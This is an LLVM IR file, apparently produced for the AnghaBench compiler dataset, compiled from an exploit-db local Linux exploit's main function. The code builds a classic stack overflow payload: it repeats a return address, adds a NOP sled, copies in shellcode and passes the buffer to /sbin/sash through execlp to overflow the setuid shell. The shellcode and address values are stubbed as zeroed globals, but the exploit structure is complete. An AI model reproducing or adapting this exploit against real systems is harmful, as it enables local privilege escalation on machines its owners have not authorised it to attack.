; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_924.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_924.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@RET = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"using address 0x%lx\0A\00", align 1
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"/sbin/sash\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"sash\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @LEN, align 4
  %7 = zext i32 %6 to i64
  %8 = call i8* @llvm.stacksave()
  store i8* %8, i8** %2, align 8
  %9 = alloca i8, i64 %7, align 16
  store i64 %7, i64* %3, align 8
  %10 = load i64, i64* @RET, align 8
  store i64 %10, i64* %4, align 8
  %11 = load i32, i32* @stderr, align 4
  %12 = load i64, i64* %4, align 8
  %13 = call i32 @fprintf(i32 %11, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0), i64 %12)
  store i32 0, i32* %5, align 4
  br label %14

14:                                               ; preds = %24, %0
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* @LEN, align 4
  %17 = icmp slt i32 %15, %16
  br i1 %17, label %18, label %27

18:                                               ; preds = %14
  %19 = load i64, i64* %4, align 8
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %9, i64 %21
  %23 = bitcast i8* %22 to i64*
  store i64 %19, i64* %23, align 1
  br label %24

24:                                               ; preds = %18
  %25 = load i32, i32* %5, align 4
  %26 = add nsw i32 %25, 4
  store i32 %26, i32* %5, align 4
  br label %14

27:                                               ; preds = %14
  store i32 0, i32* %5, align 4
  br label %28

28:                                               ; preds = %41, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* @LEN, align 4
  %31 = load i32, i32* @shellcode, align 4
  %32 = call i32 @strlen(i32 %31)
  %33 = sub nsw i32 %30, %32
  %34 = sub nsw i32 %33, 100
  %35 = icmp slt i32 %29, %34
  br i1 %35, label %36, label %44

36:                                               ; preds = %28
  %37 = load i8, i8* @NOP, align 1
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %9, i64 %39
  store i8 %37, i8* %40, align 1
  br label %41

41:                                               ; preds = %36
  %42 = load i32, i32* %5, align 4
  %43 = add nsw i32 %42, 1
  store i32 %43, i32* %5, align 4
  br label %28

44:                                               ; preds = %28
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %9, i64 %46
  %48 = load i32, i32* @shellcode, align 4
  %49 = load i32, i32* @shellcode, align 4
  %50 = call i32 @strlen(i32 %49)
  %51 = call i32 @memcpy(i8* %47, i32 %48, i32 %50)
  %52 = call i32 @execlp(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %9)
  store i32 0, i32* %1, align 4
  %53 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %53)
  %54 = load i32, i32* %1, align 4
  ret i32 %54
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i64) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @execlp(i8*, i8*, i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
